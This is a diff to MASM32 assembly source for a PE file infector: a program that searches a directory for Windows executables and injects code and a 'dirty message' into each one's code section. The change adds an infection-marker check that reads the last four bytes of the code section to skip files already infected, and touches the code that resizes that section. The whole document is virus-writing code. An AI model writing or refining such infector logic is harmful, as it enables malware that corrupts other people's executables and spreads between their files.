@@ -16,8 +16,9 @@ include c:\masm32\macros\macros.asm
 .data
     errorNotPEFileMsg   db  'This file is not a PEFile', 0Ah, 0
     errorOpenFileMsg   db  'Cannt Open File', 0Ah, 0
-    errorFindCodeSectionMsg db  'There are some error when finding for code section', 0
-    errorFindFileMsg db  'There are some error when finding for files in directory', 0
+    errorFindCodeSectionMsg db  'There are some error when finding for code section', 0Ah, 0
+    errorFindFileMsg db  'There are some error when finding for files in directory', 0Ah, 0
+    errorFileAlreadyInjectedMsg db  'This file have already injected', 0Ah, 0
     startInjectingMessage   db  'Starting inject dirty code to file: ', 0
     successInjectMsg    db  'Success inject code to file: ', 0
     endOfLine   db  0Ah,0
@@ -63,6 +64,7 @@ include c:\masm32\macros\macros.asm
     sectionVirtualAddress   dd  ?    ; used when loop through all sections
     sectionRawSize  dd  ?    ; used when loop through all sections
 
+    last4bytesOfCodeSection dd  ?   ; This is used to test is the file is already injected (if last 4 bytes = 0)
     addressInfectMsg    dd  ?   ; point to dirty message
 
     lpBuffer    dd  0
@@ -289,6 +291,30 @@ getOffsetCodeSection:
         push fileHandle                     ; hFile
         call ReadFile
 
+CheckIfThisFileHaveBeenInjected:
+    push ebx
+
+    mov ebx, codeSectionOffset
+    add ebx, sectionRawSize
+    sub ebx, 4  ; Dword to test 4 bytes
+
+    push FILE_BEGIN                     ; dwMoveMethod
+    push NULL                           ; lpDistanceToMoveHigh
+    push ebx                            ; lDistanceToMove
+    push fileHandle                     ; hFile
+    call SetFilePointer
+    push 0                              ; lpOverlapped
+    push offset BytesRead               ; lpNumberOfBytesRead
+    push 4                              ; nNumberOfBytesToRead
+    push offset last4bytesOfCodeSection ; lpBuffer
+    push fileHandle                     ; hFile
+    call ReadFile
+
+    cmp last4bytesOfCodeSection, 0
+    jnz errorFileAlreadyInjected
+
+    pop ebx
+
 ChangeVirtualSizeOfCodeSection:
     sub ebx, 12 ; virtual Size
     push FILE_BEGIN                     ; dwMoveMethod
@@ -402,6 +428,11 @@ errorNotPEFile:
 
 errorFindCodeSection:
     push offset errorFindCodeSectionMsg
+    call StdOut
+    jmp closeFileHandle
+
+errorFileAlreadyInjected:
+    push offset errorFileAlreadyInjectedMsg
     call StdOut
     jmp closeFileHandle
 
